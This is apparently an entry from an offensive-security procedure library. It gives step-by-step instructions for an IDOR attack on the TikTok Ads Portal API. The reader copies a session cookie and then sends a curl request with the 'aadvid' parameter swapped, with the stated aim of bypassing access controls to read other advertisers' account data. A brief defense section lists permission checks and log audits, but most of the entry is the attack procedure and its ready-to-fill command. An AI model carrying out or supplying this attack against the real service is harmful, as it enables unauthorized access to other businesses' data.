---
id: proc-tiktok-manipulate-aadvid
tags:
  - idor
  - parameter-manipulation
  - web
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-manipulate-aadvid]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:24:56.699Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Manipulate 'aadvid' Parameter for Unauthorized Access

## Summary

This procedure demonstrates tampering with the 'aadvid' parameter in the TikTok Ads Portal API to access data from other advertiser accounts in the same business group, exploiting missing authorization checks.

## Description

The vulnerability stems from the endpoint directly using the 'aadvid' without verifying the requester's permissions for that specific account. When accounts share a business group, manipulation succeeds, leading to info disclosure. This is a classic IDOR scenario in a web application, requiring only session authenticity.

## Requirements

1. Identified endpoint URL from prior reconnaissance
2. Target 'aadvid' values (e.g., from portal UI enumeration)
3. Active authenticated session cookie or token
4. Proxy or curl for request modification

## Defense

Defensive measures and detection strategies:

- Enforce server-side permission checks for each 'aadvid' request
- Rate-limit API calls and validate parameter integrity
- Audit logs for cross-account access patterns

## Objectives

1. Bypass access controls via parameter change
2. Trigger unauthorized data retrieval
3. Confirm IDOR exploitability

## Instructions

### Step 1: Extract Session Details

**Context**: Capture authentication artifacts for request replay.

In browser dev tools, copy the session cookie from a legitimate request to the endpoint.

**Expected Output**: Cookie string like 'session=abc123; auth_token=xyz'.

### Step 2: Modify and Send Request

**Context**: Alter 'aadvid' to target another account and execute the request.

Use [[commands/curl-manipulate-aadvid]] to send the tampered request, replacing placeholders with real values:

```bash
curl -X GET "https://ads.tiktok.com/api/advertiser/info?aadvid=TARGET_ID" -H "Cookie: session=your_session" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> This command fetches data for the target ID; success is indicated by a 200 response with account details.

**Expected Output**: JSON response with target account data if vulnerable.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-manipulate-aadvid]]

## Tools Used


## Tags

- [[idor]]
- [[parameter-manipulation]]
- [[web]]
